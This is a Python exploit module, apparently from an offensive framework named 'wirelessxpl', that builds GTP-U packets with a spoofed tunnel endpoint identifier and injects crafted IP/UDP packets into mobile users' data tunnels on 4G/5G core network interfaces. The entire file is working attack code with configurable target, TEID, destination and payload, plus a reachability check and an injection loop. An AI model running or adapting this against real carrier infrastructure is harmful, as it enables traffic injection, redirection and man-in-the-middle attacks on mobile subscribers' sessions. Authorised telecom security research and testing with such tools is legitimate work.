# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """GTP-U Tunnel Data Plane Injection and Redirect.

    GTP-U (GPRS Tunnelling Protocol User Plane) carries user data
    between the eNodeB/gNodeB and the core network (SGW/PGW in 4G,
    UPF in 5G). The protocol uses UDP port 2152 and encapsulates
    IP packets inside GTP-U headers identified by a TEID (Tunnel
    Endpoint Identifier).

    If an attacker can inject packets to the GTP-U interface (e.g.
    from a compromised eNodeB, an adjacent network, or an exposed
    GTP-U endpoint), they can inject arbitrary data into a user's
    tunnel by spoofing the correct TEID. This enables traffic
    injection, redirection, and man-in-the-middle attacks on
    mobile data sessions.

    This module constructs and injects crafted GTP-U packets with
    spoofed TEIDs to demonstrate data plane injection.

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "GTP-U Tunnel Data Plane Injection",
        "description": (
            "Injects crafted packets into GTP-U tunnels between "
            "eNodeB/gNodeB and the mobile core (SGW/PGW/UPF). By "
            "spoofing the TEID, an attacker can inject arbitrary "
            "data into a user's mobile data session, enabling "
            "traffic injection, redirection, or MitM attacks."
        ),
        "authors": (
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.3gpp.org/specifications/numbering/ts-29-series",
            "https://www.etsi.org/deliver/etsi_ts/129200_129299/129281/",
        ),
        "disclosure_date": "2024-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "4G/LTE core network (SGW/PGW GTP-U interface)",
            "5G core network (UPF N3/N9 GTP-U interface)",
            "Exposed GTP-U endpoints on UDP 2152",
        ),
    }

    target = OptIP("", "Target GTP-U endpoint (SGW/PGW/UPF IP)")
    port = OptPort(2152, "GTP-U UDP port")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    teid = OptInteger(0x00000001, "Target Tunnel Endpoint Identifier (TEID)")
    inject_dst = OptIP("8.8.8.8", "Destination IP for injected inner packet")
    inject_payload = OptString("INJECTED", "Payload data for injected packet")
    packet_count = OptInteger(10, "Number of packets to inject")

    # GTP-U constants (3GPP TS 29.281)
    _GTP_VERSION = 1
    _GTP_PT = 1  # GTP (not GTP')
    _GTP_MSG_TYPE_GPDU = 0xFF  # G-PDU (encapsulated user data)
    _GTP_MSG_TYPE_ECHO_REQ = 0x01
    _GTP_MSG_TYPE_ECHO_RSP = 0x02

    _GTP_HEADER_LEN = 8  # Minimum GTP-U header length

    def _build_gtp_header(self, msg_type: int, payload_len: int, teid: int) -> bytes:
        """Build a GTP-U header.

        Format (8 bytes minimum):
        - Flags: version(3) | PT(1) | reserved(1) | E(1) | S(1) | PN(1)
        - Message Type (1 byte)
        - Length (2 bytes, big-endian): payload length excluding header
        - TEID (4 bytes, big-endian)
        """
        flags = (self._GTP_VERSION << 5) | (self._GTP_PT << 4)
        return struct.pack(">BBHI", flags, msg_type, payload_len, teid)

    def _build_inner_ip_packet(self, dst_ip: str, payload: bytes) -> bytes:
        """Build a minimal IPv4 packet for tunnel injection."""
        # Fake source IP
        src_ip = socket.inet_aton("10.0.0.1")
        dst_addr = socket.inet_aton(dst_ip)

        # IPv4 header (20 bytes, no options)
        version_ihl = 0x45
        dscp_ecn = 0x00
        total_length = 20 + 8 + len(payload)  # IP + UDP + payload
        identification = 0x1234
        flags_offset = 0x4000  # Don't Fragment
        ttl = 64
        protocol = 17  # UDP
        checksum = 0  # Will be calculated by kernel or left zero

        ip_header = struct.pack(
            ">BBHHHBBH4s4s",
            version_ihl, dscp_ecn, total_length,
            identification, flags_offset,
            ttl, protocol, checksum,
            src_ip, dst_addr,
        )

        # UDP header (8 bytes)
        src_port = 12345
        dst_port = 80
        udp_length = 8 + len(payload)
        udp_checksum = 0
        udp_header = struct.pack(">HHHH", src_port, dst_port, udp_length, udp_checksum)

        return ip_header + udp_header + payload

    def _build_echo_request(self) -> bytes:
        """Build a GTP-U Echo Request for connectivity testing."""
        return self._build_gtp_header(self._GTP_MSG_TYPE_ECHO_REQ, 0, 0)

    def _build_inject_packet(self) -> bytes:
        """Build a complete GTP-U G-PDU with injected inner packet."""
        inner = self._build_inner_ip_packet(
            str(self.inject_dst),
            self.inject_payload.encode() if isinstance(self.inject_payload, str) else self.inject_payload,
        )
        header = self._build_gtp_header(self._GTP_MSG_TYPE_GPDU, len(inner), self.teid)
        return header + inner

    @mute
    def check(self) -> bool:
        """Send GTP-U Echo Request to verify endpoint."""
        if not self.target:
            return False
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            echo_req = self._build_echo_request()
            sock.sendto(echo_req, (str(self.target), self.port))
            try:
                data, _ = sock.recvfrom(1024)
                sock.close()
                return len(data) >= self._GTP_HEADER_LEN
            except (OSError, TimeoutError):
                sock.close()
                return True  # Port may be open but not responding to echo
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target (GTP-U endpoint IP) is required")
            return

        if not self.check():
            print_error(f"GTP-U endpoint {self.target}:{self.port} not reachable")
            return

        print_success(f"GTP-U endpoint reachable; injecting into TEID 0x{self.teid:08X}")
        self._exploit()

    def _exploit(self) -> None:
        inject_pkt = self._build_inject_packet()

        print_status(f"GTP-U inject packet: {len(inject_pkt)} bytes")
        print_status(f"Target TEID: 0x{self.teid:08X}")
        print_status(f"Inner destination: {self.inject_dst}")
        print_status(f"Injecting {self.packet_count} packets")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)

            sent = 0
            for i in range(self.packet_count):
                sock.sendto(inject_pkt, (str(self.target), self.port))
                sent += 1
                time.sleep(0.01)

            sock.close()
            print_success(
                f"Injected {sent}/{self.packet_count} GTP-U packets into "
                f"TEID 0x{self.teid:08X}. The inner IP packets appear "
                "as legitimate user traffic within the tunnel, enabling "
                "data injection into the target mobile session."
            )
        except OSError as e:
            print_error(f"Injection failed: {e}")
